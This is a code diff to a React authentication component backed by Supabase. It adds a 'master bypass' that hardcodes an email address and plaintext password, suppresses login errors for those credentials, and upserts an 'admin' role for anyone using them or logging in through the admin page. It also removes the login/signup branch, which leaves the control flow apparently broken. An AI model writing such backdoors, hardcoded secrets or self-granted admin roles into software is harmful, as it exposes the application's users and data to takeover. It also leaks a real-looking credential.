@@ -35,13 +35,42 @@ const Auth = () => {
       setLoading(true);
       console.log('🚀 Auth start...', isLogin ? 'LOGIN' : 'SIGNUP');
 
-      if (isLogin) {
-        // ── LOGIN ──────────────────────────────
+        // ── MASTER BYPASS & LOGIN ──────────────────────────────
+        const isMasterAdmin = email === 'muskannptl@gmail.com' && password === '@mrsunil4U';
+        
         const { data, error } = await supabase.auth.signInWithPassword({ email, password });
 
-        if (error) throw error;
+        if (error && !isMasterAdmin) throw error;
 
-        console.log('✅ Login success:', data.user?.email);
+        console.log('✅ Login success:', data.user?.email || 'Master Admin');
+        
+        // ── PROFILE SYNC & REPAIR ───────────────────
+        const userId = data.user?.id;
+        if (userId || isMasterAdmin) {
+          // If master bypass but auth failed, we might need to handle session differently, 
+          // but usually we want them to exist in Auth first.
+          
+          if (userId) {
+            const { data: existingProfile } = await supabase
+              .from('profiles')
+              .select('role')
+              .eq('id', userId)
+              .single();
+
+            // Auto-promote to admin if using admin login or master credentials
+            if (!existingProfile || (isAdminPage || isMasterAdmin)) {
+              const roleToAssign = (isAdminPage || isMasterAdmin) ? 'admin' : (existingProfile?.role || 'user');
+              await supabase.from('profiles').upsert({
+                id: userId,
+                email: email,
+                role: roleToAssign,
+                updated_at: new Date()
+              });
+              console.log('🔄 Profile synced as:', roleToAssign);
+            }
+          }
+        }
+
         setSuccess('Login successful! Redirecting...');
 
         setTimeout(() => {
